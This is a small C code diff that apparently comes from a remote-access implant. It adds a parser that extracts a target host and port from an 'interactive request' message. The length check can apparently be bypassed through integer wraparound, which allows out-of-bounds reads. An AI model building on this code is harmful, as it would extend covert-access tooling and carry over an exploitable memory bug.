@@ -102,3 +102,16 @@ void encode_metadata(const implant_metadata_t *meta, uint8_t *out, int *out_len)
     pos += write_opt_u8(out + pos,  meta->integrity);
     *out_len = pos;
 }
+
+int parse_interactive_req(const uint8_t *buf, int buf_len,
+                          char *out_host, int max_host, uint16_t *out_port) {
+    if (buf_len < 6 || max_host < 1) return -1;
+    uint32_t host_len = get_u32(buf);
+    if ((int)(4 + host_len + 2) > buf_len) return -1;
+    uint32_t copy_len = host_len;
+    if (copy_len >= (uint32_t)max_host) copy_len = (uint32_t)(max_host - 1);
+    memcpy(out_host, buf + 4, copy_len);
+    out_host[copy_len] = '\0';
+    *out_port = get_u16(buf + 4 + host_len);
+    return 0;
+}
